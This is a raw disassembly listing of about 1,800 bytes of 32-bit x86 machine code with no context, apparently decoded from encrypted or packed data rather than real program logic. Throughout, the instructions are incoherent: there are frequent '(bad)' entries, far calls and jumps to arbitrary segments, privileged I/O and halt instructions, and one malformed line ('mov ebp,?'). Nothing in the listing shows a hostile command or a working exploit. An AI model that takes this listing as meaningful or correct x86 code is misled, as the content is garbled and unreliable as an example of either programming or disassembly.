  404fd9:	or     BYTE PTR [ebp-0x2],0x79
  404fdd:	inc    eax
  404fde:	add    BYTE PTR [ebx],cl
  404fe0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404fe1:	ficomp DWORD PTR [ecx-0x68]
  404fe4:	mov    edx,0x9893bf62
  404fe9:	(bad)  
  404fea:	xchg   esp,eax
  404feb:	push   edx
  404fec:	test   DWORD PTR [esi],edx
  404fee:	or     eax,0x610cf635
  404ff3:	aad    0xd5
  404ff5:	(bad)  
  404ff6:	call   0x6f44:0x9a4ad3d
  404ffd:	dec    esp
  404ffe:	mov    ds:0xce27d812,eax
  405003:	jb     0x404ff8
  405005:	add    ebx,DWORD PTR [ecx+0x20]
  405008:	loope  0x40507f
  40500a:	lea    esp,[edi+ecx*8]
  40500d:	jmp    0x405076
  40500f:	pop    es
  405010:	jle    0x405005
  405012:	pop    ss
  405013:	xchg   edi,eax
  405014:	ret    0x99aa
  405017:	call   0x4b31:0x96e8cff0
  40501e:	mov    DWORD PTR [eax],edi
  405020:	fsubr  st,st(4)
  405022:	jns    0x404fe3
  405024:	mov    ah,BYTE PTR [esi]
  405026:	inc    ebp
  405027:	and    eax,0xcf42e239
  40502c:	(bad)  
  40502d:	popa   
  40502e:	push   esi
  40502f:	(bad)  
  405030:	push   ebp
  405031:	mov    ecx,0x3af3259e
  405036:	mov    gs,WORD PTR [ecx-0xb]
  405039:	jmp    0x4a8d:0x34153523
  405040:	mov    ds:0x55fdf9aa,eax
  405045:	add    al,0x91
  405047:	cdq    
  405048:	mov    ebp,0x562bee36
  40504d:	sub    al,0xb5
  40504f:	mov    al,bl
  405051:	scas   al,BYTE PTR es:[edi]
  405052:	pop    esp
  405053:	imul   eax,DWORD PTR [edx-0x19078e1c],0x8c192cdb
  40505d:	das    
  40505e:	cli    
  40505f:	ret    
  405060:	push   eax
  405061:	aas    
  405062:	dec    sp
  405064:	pusha  
  405065:	adc    BYTE PTR [edx],bh
  405067:	and    dh,BYTE PTR [ecx-0x9c376d]
  40506d:	das    
  40506e:	call   0x6ba3dbfc
  405073:	or     DWORD PTR [eax-0x2a2894b0],ebx
  405079:	mov    ds:0x3a230aa2,al
  40507e:	and    ah,BYTE PTR [eax-0x3f29d4e1]
  405084:	add    cl,al
  405086:	js     0x4050fa
  405088:	fld    TBYTE PTR [edi]
  40508a:	jge    0x405062
  40508c:	test   eax,0x62919a6b
  405091:	or     DWORD PTR ds:0xb18ebbdd,esp
  405097:	(bad)  
  405098:	or     eax,0x1f005aa5
  40509d:	jb     0x405098
  40509f:	pop    DWORD PTR [ecx+0x7b]
  4050a2:	repz ror BYTE PTR [edx+0x5e7c3933],0x32
  4050aa:	push   eax
  4050ab:	popa   
  4050ac:	test   cl,cl
  4050ae:	dec    esi
  4050af:	dec    ebp
  4050b0:	aad    0x67
  4050b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4050b3:	pop    ebx
  4050b4:	dec    DWORD PTR es:[ecx+0x22]
  4050b8:	call   0xb7fa0f77
  4050bd:	mov    esi,0xbfc8d792
  4050c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4050c3:	cwde   
  4050c4:	sub    DWORD PTR [eax+0xf5944ce],edi
  4050ca:	mov    edi,0xd0baf1d0
  4050cf:	sbb    ch,ah
  4050d1:	pop    es
  4050d2:	int    0x3a
  4050d4:	stc    
  4050d5:	xchg   DWORD PTR [ebx+eax*8],eax
  4050d8:	inc    ecx
  4050d9:	imul   edi,DWORD PTR [ebx+edx*4+0xb],0x533899f4
  4050e1:	lock pop ds
  4050e3:	fwait
  4050e4:	outs   dx,DWORD PTR ds:[esi]
  4050e5:	fwait
  4050e6:	xchg   ebx,eax
  4050e7:	addr16 and eax,0xb558dcc1
  4050ed:	hlt    
  4050ee:	dec    edi
  4050ef:	and    ebp,DWORD PTR [edx+0x343388ad]
  4050f5:	addr16 pop edi
  4050f7:	shr    DWORD PTR [esi-0x4a],cl
  4050fa:	mov    ch,0xe0
  4050fc:	add    esi,DWORD PTR [edx-0x57]
  4050ff:	inc    ebx
  405100:	sub    eax,0xa43a997
  405105:	or     bh,BYTE PTR [edx-0x43]
  405108:	cli    
  405109:	lds    esi,FWORD PTR [eax]
  40510b:	and    al,BYTE PTR [ebx+0xbd6d4c3]
  405111:	outs   dx,DWORD PTR ds:[esi]
  405112:	xchg   ebx,eax
  405113:	pushf  
  405114:	(bad)  
  405115:	repz pop edx
  405117:	push   ebx
  405118:	jae    0x4050ca
  40511a:	(bad)  
  40511b:	xchg   BYTE PTR [eax+eax*1],ch
  40511e:	pop    es
  40511f:	mov    WORD PTR [edi],cs
  405121:	lea    eax,[edi-0x4366a75e]
  405127:	mov    ebp,0x7683ef4a
  40512c:	fdivr  QWORD PTR [edi+0x54]
  40512f:	ror    DWORD PTR [ebp+0x30],cl
  405132:	sub    al,0xe3
  405134:	mov    bl,0x63
  405136:	cmp    BYTE PTR [ecx+0x532c05ff],bl
  40513c:	imul   ebp,DWORD PTR [ebp+0x350dc018],0x96f2247
  405146:	xchg   edi,eax
  405147:	adc    BYTE PTR [esp+ebx*1],cl
  40514a:	dec    ebx
  40514b:	je     0x40516f
  40514d:	mov    edx,0x7749651c
  405152:	int    0x88
  405154:	push   cs
  405155:	fs adc ecx,ecx
  405158:	inc    ecx
  405159:	fild   WORD PTR [edi-0x68ace48]
  40515f:	cli    
  405160:	les    eax,FWORD PTR [esi]
  405162:	rol    DWORD PTR [edx+ecx*1+0x22407e62],1
  405169:	mov    eax,0x37fa6d4e
  40516e:	mov    al,0x5
  405170:	pop    ebp
  405171:	nop
  405172:	pop    ebp
  405173:	in     eax,dx
  405174:	sub    BYTE PTR [ecx+edx*2-0x31],al
  405178:	bound  edi,QWORD PTR [eax+ebp*8+0x7029d2da]
  40517f:	dec    esp
  405180:	lock rcl DWORD PTR [ecx],cl
  405183:	xor    eax,0x52699de8
  405188:	and    DWORD PTR [edx],ecx
  40518a:	ret    
  40518b:	lods   eax,DWORD PTR ds:[esi]
  40518c:	inc    ecx
  40518d:	hlt    
  40518e:	sbb    al,0x36
  405190:	enter  0x9ef3,0x95
  405194:	retf   
  405195:	jns    0x40511c
  405197:	loope  0x4051c1
  405199:	stos   DWORD PTR es:[edi],eax
  40519a:	mov    ah,0xbe
  40519c:	imul   edi,DWORD PTR [edx+0x59],0x62
  4051a0:	clc    
  4051a1:	mov    bh,0x9f
  4051a3:	enter  0x88eb,0x55
  4051a7:	ffree  st(0)
  4051a9:	ret    0x6c33
  4051ac:	lock test al,0x7c
  4051af:	sbb    al,0xc1
  4051b1:	out    dx,al
  4051b2:	aam    0xe0
  4051b4:	mov    WORD PTR [edi+0x654dc767],fs
  4051ba:	and    al,0x17
  4051bc:	xlat   BYTE PTR ds:[ebx]
  4051bd:	pop    esp
  4051be:	or     ah,BYTE PTR [ecx-0x5d]
  4051c1:	mov    eax,ds:0x42de606a
  4051c6:	sbb    ah,BYTE PTR [eax+0x46eec671]
  4051cc:	jne    0x4051d7
  4051ce:	mov    ch,0xd4
  4051d0:	dec    esi
  4051d1:	add    BYTE PTR [ecx-0x29],cl
  4051d4:	dec    DWORD PTR [ebp+0x1e]
  4051d7:	in     al,0xf7
  4051d9:	pop    ss
  4051da:	repnz loop 0x40521a
  4051dd:	or     eax,0xd76d55b9
  4051e2:	push   cs
  4051e3:	lods   eax,DWORD PTR ds:[esi]
  4051e4:	rcr    DWORD PTR [edi+0x23],cl
  4051e7:	lods   al,BYTE PTR ds:[esi]
  4051e8:	ja     0x4051d4
  4051ea:	cmc    
  4051eb:	popa   
  4051ec:	sbb    bh,0x52
  4051ef:	push   ebp
  4051f0:	call   0x1712:0x2788a0e9
  4051f7:	pusha  
  4051f8:	sbb    cl,ah
  4051fa:	mov    esi,0x35883e4e
  4051ff:	fdiv   DWORD PTR [edx+0x2471e43d]
  405205:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405206:	imul   ch
  405208:	xbegin 0x39835fc7
  40520e:	pop    ebx
  40520f:	sbb    cl,BYTE PTR [esi+ebp*2-0x5b]
  405213:	jmp    0xdf0d:0x7d1df7cf
  40521a:	fst    QWORD PTR [ebx]
  40521c:	sbb    eax,0xc31eb08a
  405221:	stos   DWORD PTR es:[edi],eax
  405222:	lea    edx,[ecx-0x45]
  405225:	dec    ecx
  405226:	mov    ebp,0xf162a60c
  40522b:	iret   
  40522c:	lds    esi,FWORD PTR [edx]
  40522e:	pop    ss
  40522f:	js     0x40524c
  405231:	dec    eax
  405232:	inc    ebx
  405233:	leave  
  405234:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405235:	leave  
  405236:	cmp    cl,BYTE PTR [edx+0x2c]
  405239:	int3   
  40523a:	adc    al,BYTE PTR [esi+0x44]
  40523d:	imul   edx,DWORD PTR [edi],0x2dff1a68
  405243:	mov    dl,0x78
  405245:	dec    ch
  405247:	stc    
  405248:	pop    eax
  405249:	and    eax,0xf0d2d1ce
  40524e:	add    DWORD PTR [ecx+0x666fdaec],0x69
  405255:	pop    esp
  405256:	js     0x40524a
  405258:	sub    al,0x2d
  40525a:	ret    0x94a
  40525d:	js     0x40524b
  40525f:	fucomip st,st(4)
  405261:	dec    ecx
  405262:	imul   ebx,DWORD PTR [edi],0x4b
  405265:	in     al,dx
  405266:	adc    ecx,DWORD PTR [edi-0x256ca1be]
  40526c:	adc    al,cl
  40526e:	or     eax,0x4e236a23
  405273:	std    
  405274:	and    dh,BYTE PTR [esi+0x4d61454e]
  40527a:	test   DWORD PTR [edi+edi*2-0x75],esp
  40527e:	frstor [ebp-0x63d5aaf1]
  405284:	adc    eax,0x1d2783d9
  405289:	scas   eax,DWORD PTR es:[edi]
  40528a:	rol    BYTE PTR [ebx+0x1c],1
  40528d:	jge    0x40527e
  40528f:	dec    ebx
  405290:	or     eax,0xb97dade
  405295:	(bad)  
  405296:	adc    ebx,esi
  405298:	push   ds
  405299:	or     ch,BYTE PTR [ebx]
  40529b:	mov    ah,0x1
  40529d:	adc    DWORD PTR [ecx-0x50],ecx
  4052a0:	les    esp,FWORD PTR [edi+ecx*1-0x380f62a0]
  4052a7:	pop    DWORD PTR [ecx]
  4052a9:	(bad)  
  4052aa:	xlat   BYTE PTR ds:[ebx]
  4052ab:	data16 out 0x56,al
  4052ae:	pop    ebp
  4052af:	shr    DWORD PTR [ebp-0x79bba777],0xbf
  4052b6:	(bad)  
  4052b7:	jge    0x40532e
  4052b9:	jecxz  0x405257
  4052bb:	clc    
  4052bc:	sbb    ebx,esi
  4052be:	gs push esp
  4052c0:	xchg   esi,eax
  4052c1:	scas   eax,DWORD PTR es:[edi]
  4052c2:	xor    dh,0x4a
  4052c5:	addr16 push esi
  4052c7:	jo     0x4052af
  4052c9:	xor    ah,0xa1
  4052cc:	bound  ecx,QWORD PTR [esi+0x56e05bbe]
  4052d2:	add    BYTE PTR [esi+0x23],ah
  4052d5:	mov    bh,BYTE PTR [esi+0x7f]
  4052d8:	sbb    dl,ch
  4052da:	push   cs
  4052db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4052dc:	fdivr  st(7),st
  4052de:	iret   
  4052df:	push   ebx
  4052e0:	stos   DWORD PTR es:[edi],eax
  4052e1:	jae    0x40533f
  4052e3:	add    DWORD PTR [ebp-0x5c3accd],edx
  4052e9:	mov    ah,0xcb
  4052eb:	lods   al,BYTE PTR ds:[esi]
  4052ec:	mov    es,WORD PTR es:[eax]
  4052ef:	jb     0x40532c
  4052f1:	adc    DWORD PTR [edi+0x4d1fc053],eax
  4052f7:	pop    esi
  4052f8:	imul   DWORD PTR [edi]
  4052fa:	adc    eax,0xb997d703
  4052ff:	and    esp,esi
  405301:	jnp    0x4052ce
  405303:	adc    DWORD PTR [edx+0x4f26f24c],edx
  405309:	adc    cl,al
  40530b:	push   edi
  40530c:	mov    edx,0x5f8b5447
  405311:	hlt    
  405312:	xchg   DWORD PTR [ebx-0x4d6f762a],eax
  405318:	mov    dl,0xbd
  40531a:	mov    al,0x65
  40531c:	mov    eax,ds:0xd3d88a9
  405321:	mov    ch,0x8a
  405323:	scas   eax,DWORD PTR es:[edi]
  405324:	rcl    ebp,cl
  405326:	retf   0xdd6b
  405329:	repz pop ebp
  40532b:	cli    
  40532c:	jp     0x40534c
  40532e:	iret   
  40532f:	mov    ah,0x7e
  405331:	jg     0x4052be
  405333:	pushf  
  405334:	sub    eax,0x6db86b37
  405339:	mov    cl,0x44
  40533b:	add    eax,0x36efd94b
  405340:	std    
  405341:	inc    edx
  405342:	test   eax,0x70684197
  405347:	sti    
  405348:	pop    ds
  405349:	mov    gs,WORD PTR [esi]
  40534b:	or     esi,DWORD PTR [esp+ebp*8-0x76]
  40534f:	arpl   dx,bx
  405351:	adc    DWORD PTR [eax+0x44],0x67
  405355:	mov    gs:0xcb15b1b9,eax
  40535b:	fild   DWORD PTR [esi+0x62]
  40535e:	call   0xc307f6d5
  405363:	dec    edx
  405364:	cmp    al,0x99
  405366:	cmp    DWORD PTR [edx+0x2a21d203],esi
  40536c:	(bad)
  40536f:	mov    es,WORD PTR [eax]
  405371:	xor    DWORD PTR [esi+0x67],esi
  405374:	mov    ss,WORD PTR [bp+di]
  405377:	xor    BYTE PTR [eax+0x74f2e536],dl
  40537d:	mov    esi,0x679c6165
  405382:	fisttp DWORD PTR [ecx]
  405384:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405385:	je     0x405360
  405387:	bound  eax,QWORD PTR [ecx+0x25]
  40538a:	adc    DWORD PTR [edi],esi
  40538c:	mov    eax,0x53be7ec2
  405391:	xchg   ecx,eax
  405392:	fs pop edx
  405394:	push   cs
  405395:	or     eax,0x22addbf5
  40539a:	repz ret 
  40539c:	mov    eax,ds:0x8abc7100
  4053a1:	inc    esp
  4053a2:	sub    eax,0xe9895e5b
  4053a7:	or     bh,BYTE PTR [ebp+0x5f6b7d1]
  4053ad:	cmp    ecx,esi
  4053af:	pop    edx
  4053b0:	add    DWORD PTR [ebp-0x4a],0x2e
  4053b4:	and    DWORD PTR [eax+0x60af3653],edx
  4053ba:	idiv   BYTE PTR [esi+esi*2-0x621a88ba]
  4053c1:	mov    ecx,0x39a46820
  4053c6:	mov    eax,0xbe409c76
  4053cb:	sub    ebp,DWORD PTR [eax-0x2e352448]
  4053d1:	outs   dx,DWORD PTR ds:[esi]
  4053d2:	add    DWORD PTR [ebx],esi
  4053d4:	or     DWORD PTR [edx],esi
  4053d6:	mov    esp,0xd0da645
  4053db:	iret   
  4053dc:	les    esp,FWORD PTR ds:0xd70619d1
  4053e2:	loop   0x4053b3
  4053e4:	test   al,0x16
  4053e6:	fld    QWORD PTR [eax-0x66]
  4053e9:	push   edi
  4053ea:	inc    edi
  4053eb:	ds add ecx,ebx
  4053ee:	jecxz  0x405414
  4053f0:	stos   BYTE PTR es:[edi],al
  4053f1:	retf   
  4053f2:	retf   
  4053f3:	(bad)  
  4053f4:	jno    0x4053a3
  4053f6:	out    0x92,eax
  4053f8:	lea    eax,[ecx+0x58]
  4053fb:	push   esi
  4053fc:	dec    esp
  4053fd:	lahf   
  4053fe:	xor    edx,DWORD PTR [eax]
  405400:	pop    ebx
  405401:	loope  0x4053bd
  405403:	bound  ebx,QWORD PTR [edi]
  405405:	js     0x4053b4
  405407:	or     ch,BYTE PTR [esi+0x4f]
  40540a:	retf   
  40540b:	test   DWORD PTR [ebp-0xba4acce],ebp
  405411:	push   ecx
  405412:	push   ss
  405413:	push   edi
  405414:	or     BYTE PTR [ecx+0x47c845cf],bh
  40541a:	jl     0x405423
  40541c:	pop    edx
  40541d:	es adc eax,0xd3eaf814
  405423:	pop    ds
  405424:	jo     0x40542b
  405426:	mov    edi,0xaad33ad
  40542b:	xor    bl,BYTE PTR [esi]
  40542d:	shl    BYTE PTR [ecx],cl
  40542f:	int    0x20
  405431:	gs loope 0x40543f
  405434:	cdq    
  405435:	lods   eax,DWORD PTR ds:[esi]
  405436:	adc    BYTE PTR [ebx],bl
  405438:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405439:	imul   ebp,ebx,0x46
  40543c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40543d:	lods   al,BYTE PTR ds:[esi]
  40543e:	es sbb al,0x0
  405441:	in     al,dx
  405442:	or     al,0xad
  405444:	fisubr DWORD PTR [ecx]
  405446:	(bad)  
  405447:	mov    al,0xfd
  405449:	mov    esp,0x1a6811ed
  40544e:	fild   WORD PTR [ebx+ebx*1-0x39]
  405452:	inc    eax
  405453:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405454:	fdiv   QWORD PTR [edi-0x5d]
  405457:	cmp    eax,DWORD PTR [esi-0x5d]
  40545a:	adc    BYTE PTR [ebp+eiz*2+0x7f],ch
  40545e:	repnz sbb eax,0x5ad12648
  405464:	dec    edx
  405465:	loop   0x4053f7
  405467:	inc    ebp
  405468:	jmp    0x872c:0xf1fd2067
  40546f:	ror    BYTE PTR [ebp-0x52403733],cl
  405475:	loopne 0x4054e9
  405477:	call   0x8713:0x9c5d4408
  40547e:	outs   dx,DWORD PTR ds:[esi]
  40547f:	(bad)  
  405480:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405481:	dec    DWORD PTR [ebx+0x6a6f69e8]
  405487:	fldl2t 
  405489:	fwait
  40548a:	xchg   ebp,eax
  40548b:	aas    
  40548c:	mov    esp,0xa3ee915f
  405491:	pusha  
  405492:	or     eax,0xb3841e2a
  405497:	iret   
  405498:	leave  
  405499:	push   edx
  40549a:	in     al,0xf
  40549c:	push   ecx
  40549d:	or     edx,ebx
  40549f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4054a0:	push   es
  4054a1:	scas   eax,DWORD PTR es:[edi]
  4054a2:	call   0xeb7db356
  4054a7:	hlt    
  4054a8:	daa    
  4054a9:	cli    
  4054aa:	mov    dl,0xfe
  4054ac:	jmp    0x421c3b89
  4054b1:	sar    DWORD PTR [edi+ebp*8],1
  4054b4:	pop    ds
  4054b5:	gs add al,0x7c
  4054b8:	test   bh,cl
  4054ba:	es push ecx
  4054bc:	cs jae 0x40548e
  4054bf:	sbb    esi,ebx
  4054c1:	hlt    
  4054c2:	ror    DWORD PTR [eax+0x61512f92],1
  4054c8:	aam    0x2f
  4054ca:	je     0x405468
  4054cc:	xchg   esi,eax
  4054cd:	adc    bl,BYTE PTR [edx-0x13792d31]
  4054d3:	cmp    BYTE PTR [edi+0x43da9909],dh
  4054d9:	sbb    WORD PTR [esi],di
  4054dc:	enter  0x3131,0x61
  4054e0:	test   eax,0x38ee2431
  4054e5:	pushf  
  4054e6:	mov    cl,0x92
  4054e8:	std    
  4054e9:	hlt    
  4054ea:	popf   
  4054eb:	jecxz  0x405493
  4054ed:	mov    bl,0x3b
  4054ef:	aas    
  4054f0:	lock mov ch,0x59
  4054f3:	jae    0x4054e3
  4054f5:	mov    bh,0xe0
  4054f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4054f8:	out    0x7d,al
  4054fa:	js     0x405559
  4054fc:	mov    dh,0x13
  4054fe:	mov    cl,0x40
  405500:	cmp    BYTE PTR [ebp+eiz*4+0x68],ch
  405504:	mov    eax,ds:0x6df11f97
  405509:	pop    ebx
  40550a:	in     eax,0x9
  40550c:	daa    
  40550d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40550e:	jae    0x405494
  405510:	sbb    DWORD PTR [edx],ebx
  405512:	inc    eax
  405513:	in     al,dx
  405514:	test   eax,0x56e693c2
  405519:	shl    DWORD PTR [edx],cl
  40551b:	sub    BYTE PTR [eax-0x59],dl
  40551e:	adc    BYTE PTR [edi+0x3c],al
  405521:	jns    0x405520
  405523:	cld    
  405524:	lods   al,BYTE PTR ds:[esi]
  405525:	mov    ebx,0xcc88afe
  40552a:	ficom  DWORD PTR [eax]
  40552c:	jl     0x40550d
  40552e:	push   edx
  40552f:	dec    ecx
  405530:	mov    ebp,esi
  405532:	ret    0x5f45
  405535:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405536:	mov    dl,0x6e
  405538:	ins    DWORD PTR es:[edi],dx
  405539:	iret   
  40553a:	icebp  
  40553b:	jg     0x4055a9
  40553d:	in     al,0xda
  40553f:	out    dx,al
  405540:	mov    BYTE PTR [esi-0x6fc45645],cl
  405546:	popa   
  405547:	and    eax,DWORD PTR [ecx+0xd]
  40554a:	mov    ecx,0xd7b9f7cc
  40554f:	sbb    eax,ecx
  405551:	pop    ss
  405552:	push   0x2b
  405554:	ja     0x4055b5
  405556:	dec    esp
  405557:	mov    BYTE PTR [eax-0x58],ch
  40555a:	sub    dh,BYTE PTR ds:0xce441bc6
  405560:	or     bl,BYTE PTR [eax]
  405562:	jmp    0xf4a8efce
  405567:	adc    dl,al
  405569:	das    
  40556a:	enter  0x6008,0xa4
  40556e:	icebp  
  40556f:	stos   DWORD PTR es:[edi],eax
  405570:	fsubr  DWORD PTR [esi]
  405572:	xchg   edx,eax
  405573:	xchg   ebx,eax
  405574:	jae    0x40550b
  405576:	das    
  405577:	(bad)  
  405578:	cmp    BYTE PTR [edi+0x51],ch
  40557b:	sub    ebx,esp
  40557d:	cdq    
  40557e:	inc    eax
  40557f:	mov    cl,BYTE PTR [edi-0x43632e9f]
  405585:	dec    ebx
  405586:	xor    al,0x78
  405588:	ret    0x7fb
  40558b:	sub    ah,BYTE PTR [edx-0x5011547b]
  405591:	daa    
  405592:	sbb    esp,esp
  405594:	push   esp
  405595:	sbb    ah,ch
  405597:	add    al,0xb0
  405599:	sub    eax,0xf3e522f3
  40559e:	push   es
  40559f:	fstp   TBYTE PTR [ebx+0x66e6a977]
  4055a5:	adc    ah,ch
  4055a7:	pop    ebx
  4055a8:	(bad)  
  4055a9:	idiv   BYTE PTR [edi+edx*2+0x1]
  4055ad:	mov    ebx,0x6b87285
  4055b2:	and    ebx,edi
  4055b4:	adc    edx,ecx
  4055b6:	or     DWORD PTR [esp+ecx*8-0x1d],0x38adcfef
  4055be:	pop    ebx
  4055bf:	shl    BYTE PTR [ecx-0x34c98cae],0x58
  4055c6:	fucomi st,st(4)
  4055c8:	xor    eax,0x5ad64c36
  4055cd:	ja     0x405609
  4055cf:	(bad)  
  4055d0:	mov    al,BYTE PTR [esi+0x4a742522]
  4055d6:	stos   DWORD PTR es:[edi],eax
  4055d7:	inc    edi
  4055d8:	xchg   esi,eax
  4055d9:	xchg   ebx,eax
  4055da:	sahf   
  4055db:	adc    bl,BYTE PTR ds:0xd521d798
  4055e1:	jmp    0x3cd9:0x494e4b25
  4055e8:	mov    bh,0x43
  4055ea:	ja     0x40562c
  4055ec:	imul   edx,DWORD PTR [edx],0xffffffc6
  4055ef:	test   al,0x82
  4055f1:	push   edx
  4055f2:	xchg   esp,eax
  4055f3:	mov    esp,0x74143258
  4055f8:	gs inc edx
  4055fa:	sar    edx,1
  4055fc:	mov    esp,0x8832a9f7
  405601:	mov    edi,0xcefc0496
  405606:	xchg   edi,esp
  405608:	mov    edi,0x4e9e41
  40560d:	cmc    
  40560e:	xor    DWORD PTR ds:0xb7004ff7,eax
  405614:	mov    ds:0xf5e1c91c,al
  405619:	bound  ecx,QWORD PTR [ebx-0xb979922]
  40561f:	mov    cl,0x9a
  405621:	inc    eax
  405622:	pushf  
  405623:	sbb    eax,0x3d005e87
  405628:	cwde   
  405629:	cmp    eax,0xf9586a28
  40562e:	and    edi,DWORD PTR [esi-0x9]
  405631:	in     eax,0xa3
  405633:	xchg   edx,eax
  405634:	cmp    al,ah
  405636:	int3   
  405637:	jmp    0xc340:0xb90dd95a
  40563e:	ret    
  40563f:	mul    DWORD PTR [ecx-0x4079b109]
  405645:	outs   dx,BYTE PTR ds:[esi]
  405646:	(bad)  
  405647:	pop    edi
  405648:	in     al,0x6f
  40564a:	ficom  WORD PTR [ebx-0x12]
  40564d:	xor    BYTE PTR [edi+ebx*2],bl
  405650:	sbb    ebp,DWORD PTR [edi+edi*1+0x3a]
  405654:	xor    ecx,esi
  405656:	mov    edi,DWORD PTR [eax-0x35]
  405659:	dec    ebp
  40565a:	xor    DWORD PTR [ebx],edi
  40565c:	aad    0x83
  40565e:	and    DWORD PTR [edx],eax
  405660:	jne    0x4056dd
  405662:	shr    DWORD PTR [edi],1
  405664:	fdivp  st(2),st
  405666:	mov    ds:0x288bea33,al
  40566b:	push   eax
  40566c:	mov    al,0xb6
  40566e:	sar    BYTE PTR [edi],1
  405670:	push   0x38
  405672:	ss pop edx
  405674:	pop    eax
  405675:	cmp    dh,BYTE PTR [eax+0x35]
  405678:	stos   BYTE PTR es:[edi],al
  405679:	pop    esi
  40567a:	shl    BYTE PTR [eax+0x6b],0x32
  40567e:	xchg   DWORD PTR [ecx+0x3d],ecx
  405681:	mov    bh,0xdd
  405683:	mov    eax,0x891c851d
  405688:	xor    dl,BYTE PTR [ebx+0x59]
  40568b:	xchg   ebp,eax
  40568c:	cmc    
  40568d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40568e:	stos   DWORD PTR es:[edi],eax
  40568f:	call   ebp
  405691:	jp     0x40561f
  405693:	add    DWORD PTR [edx+0xb],edi
  405696:	mov    esp,0xd8f9a17f
  40569b:	ret    0x391d
  40569e:	dec    ebp
  40569f:	inc    esp
  4056a0:	pop    es
  4056a1:	je     0x405642
  4056a3:	mov    ecx,0x5eb8c19f
  4056a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4056a9:	sbb    al,0x60
  4056ab:	shr    ebp,1
  4056ad:	mov    ch,BYTE PTR [ecx-0x6b4f034a]
  4056b3:	mov    eax,0x6aa45eb6
  4056b8:	sub    dl,dl
  4056ba:	pop    ebp
  4056bb:	adc    BYTE PTR [edx-0x5c],bl
  4056be:	mov    ebp,?
  4056c0:	rol    DWORD PTR [eax+0x7b0d7f74],cl
  4056c6:	outs   dx,DWORD PTR ds:[esi]
  4056c7:	cmp    al,0x91
  4056c9:	push   ebx
  4056ca:	inc    ecx
  4056cb:	and    al,0xd0
  4056cd:	test   DWORD PTR [edx],esp
  4056cf:	ss into 
  4056d1:	xor    dh,BYTE PTR [ebx+0x55]
  4056d4:	ret    0x3f49
  4056d7:	in     al,0x65
  4056d9:	lea    edx,[ecx-0x1e]
  4056dc:	mov    gs,WORD PTR [ecx-0x80]
  4056df:	cmp    eax,0xb431e917
  4056e4:	je     0x405697
  4056e6:	test   eax,0x19d5abc2
  4056eb:	dec    esi
  4056ec:	cwde   
  4056ed:	mov    cl,0xfa
  4056ef:	mov    fs,WORD PTR [edi+0x7f05de2]
  4056f5:	bound  ebp,QWORD PTR ss:[edi-0x6b]
  4056f9:	inc    esi
  4056fa:	or     al,0xf7
  4056fc:	in     eax,0x87
  4056fe:	jg     0x405689
  405700:	cwde   
  405701:	aad    0x5e
  405703:	outs   dx,BYTE PTR ds:[esi]
  405704:	push   ds
  405705:	add    dl,BYTE PTR [esi]
  405707:	imul   ecx,DWORD PTR [esi-0x1e],0x6c8ecd68
  40570e:	test   eax,0xef6da529
  405713:	ffree  st(3)
  405715:	out    0x93,al
  405717:	cmp    DWORD PTR [ebp-0x47],esi
  40571a:	cmp    DWORD PTR [esp+ebp*4-0x7a2743b0],ebp
  405721:	idiv   BYTE PTR [edx]
  405723:	aam    0xb6
  405725:	inc    ebx
  405726:	xchg   ebx,eax
  405727:	push   ebx
  405728:	and    al,0x57
  40572a:	int    0x27
  40572c:	fld    st(1)
  40572e:	pop    ecx
  40572f:	mov    ss,WORD PTR [esi-0x5e5a9bae]
  405735:	push   DWORD PTR [ebp-0x3858eee]
  40573b:	stc    
  40573c:	(bad)  
  40573d:	and    ecx,edx
  40573f:	sub    al,0x14
  405741:	mov    edi,0x156b5696
  405746:	mov    eax,DWORD PTR [ebx+0x71a4c892]
  40574c:	sti    
  40574d:	push   eax
  40574e:	dec    ecx
  40574f:	loop   0x405771
  405751:	idiv   ah
  405753:	mov    bh,0xf2
  405755:	dec    esp
  405756:	mov    bh,0xdf
  405758:	stc    
  405759:	test   DWORD PTR [ebx+0x75a73379],eax
  40575f:	fdiv   QWORD PTR [edx-0x4]
  405762:	pushf  
  405763:	jno    0x405785
  405765:	pop    edx
  405766:	inc    eax
  405767:	addr16 mov dl,0xf8
  40576a:	xchg   edi,eax
  40576b:	loope  0x405789
  40576d:	mov    ds:0xc18066dd,al
  405772:	and    dl,bh
  405774:	sub    al,BYTE PTR [esi]
  405776:	addr16 inc edi
  405778:	fisubr WORD PTR [eax+esi*4+0x4a]
  40577c:	xchg   BYTE PTR [edx+ebp*8+0xfe4a3b2],bh
  405783:	test   al,bh
  405785:	outs   dx,BYTE PTR ds:[esi]
  405786:	and    BYTE PTR [ecx+0x40dc2cb1],ch
  40578c:	mov    ds:0xee780d2d,eax
  405791:	clc    
  405792:	and    al,0x9e
  405794:	imul   edx,DWORD PTR [edi-0x77],0xac0e76b3
  40579b:	aad    0x31
  40579d:	sar    al,1
  40579f:	mov    DWORD PTR [ecx+edx*4+0x654a2f7d],esi
  4057a6:	adc    ch,dl
  4057a8:	outs   dx,BYTE PTR ds:[esi]
  4057a9:	in     eax,0x67
  4057ab:	fisttp WORD PTR [esi-0x6d]
  4057ae:	ret    
  4057af:	mov    esp,0xc47511ab
  4057b4:	pop    es
  4057b5:	sbb    BYTE PTR [ebp+0x6dd5b480],ch
  4057bb:	xor    al,0x15
  4057bd:	xor    BYTE PTR [edx+0x47cb1b33],dl
  4057c3:	jno    0x405789
  4057c5:	mov    esp,0x8202d285
  4057ca:	sub    DWORD PTR [ebp+0x7839ddc3],0xf6b36df3
  4057d4:	lahf   
  4057d5:	jmp    0xee6e:0x59ea2b88
  4057dc:	push   edi
